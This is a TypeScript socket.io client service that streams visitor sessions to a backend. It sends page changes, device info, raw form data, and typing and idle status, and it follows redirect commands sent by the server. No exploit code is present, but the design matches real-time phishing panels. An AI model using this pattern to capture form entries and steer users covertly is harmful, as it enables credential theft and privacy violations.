import { io, Socket } from 'socket.io-client';
import { SOCKET_URL } from '../config';
import { getDeviceInfo, DeviceInfo } from '../utils/deviceInfo';

class SocketService {
  private socket: Socket | null = null;
  private sessionId: string = '';
  private deviceInfo: DeviceInfo | null = null;

  // Initialize socket connection
  async connect(sessionId: string): Promise<Socket> {
    if (this.socket?.connected) {
      return this.socket;
    }

    this.sessionId = sessionId;
    
    // Get device info once on connect
    if (!this.deviceInfo) {
      this.deviceInfo = await getDeviceInfo();
    }
    
    this.socket = io(SOCKET_URL, {
      transports: ['websocket', 'polling'],
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionAttempts: 5,
    });

    this.setupEventListeners();
    return this.socket;
  }

  // Setup event listeners
  private setupEventListeners(): void {
    if (!this.socket) return;

    this.socket.on('connect', () => {
      console.log('✅ Connected to backend:', this.socket?.id);
    });

    this.socket.on('disconnect', () => {
      console.log('❌ Disconnected from backend');
    });

    this.socket.on('connect_error', (error) => {
      console.error('Connection error:', error);
    });

    this.socket.on('visitor:redirect', (data: { targetPage: string }) => {
      console.log('📍 Redirect command received:', data.targetPage);
      // This will be handled by the component
    });
  }

  // Join as visitor
  joinAsVisitor(page: string): void {
    if (!this.socket?.connected) {
      console.warn('Socket not connected');
      return;
    }

    this.socket.emit('visitor:join', {
      sessionId: this.sessionId,
      page,
      deviceInfo: this.deviceInfo,
    });
    console.log(`👤 Joined as visitor on page: ${page}`);
  }

  // Track page change
  trackPageChange(page: string): void {
    if (!this.socket?.connected) {
      console.warn('Socket not connected');
      return;
    }

    this.socket.emit('visitor:page-change', {
      sessionId: this.sessionId,
      page,
      deviceInfo: this.deviceInfo,
    });
    console.log(`📄 Page changed to: ${page}`);
  }

  // Save visitor data
  saveVisitorData(formData: any, page: string): void {
    if (!this.socket?.connected) {
      console.warn('Socket not connected');
      return;
    }

    this.socket.emit('visitor:save-data', {
      sessionId: this.sessionId,
      formData,
      page,
      deviceInfo: this.deviceInfo,
    });
    console.log(`💾 Data saved for page: ${page}`);
  }

  // Listen for redirect commands
  onRedirect(callback: (targetPage: string) => void): void {
    if (!this.socket) return;

    this.socket.on('visitor:redirect', (data: { targetPage: string }) => {
      callback(data.targetPage);
    });
  }

  // Remove redirect listener
  offRedirect(): void {
    if (!this.socket) return;
    this.socket.off('visitor:redirect');
  }

  // Disconnect
  disconnect(): void {
    if (this.socket) {
      this.socket.disconnect();
      this.socket = null;
    }
  }

  // Get socket instance
  getSocket(): Socket | null {
    return this.socket;
  }

  // Get session ID
  getSessionId(): string {
    return this.sessionId;
  }

  // Notify typing status
  notifyTyping(): void {
    if (!this.socket?.connected) return;
    this.socket.emit('visitor:typing', { sessionId: this.sessionId });
  }

  // Notify stopped typing
  notifyStoppedTyping(): void {
    if (!this.socket?.connected) return;
    this.socket.emit('visitor:stopped-typing', { sessionId: this.sessionId });
  }

  // Notify idle
  notifyIdle(): void {
    if (!this.socket?.connected) return;
    this.socket.emit('visitor:idle', { sessionId: this.sessionId });
  }
}

// Export singleton instance
export const socketService = new SocketService();
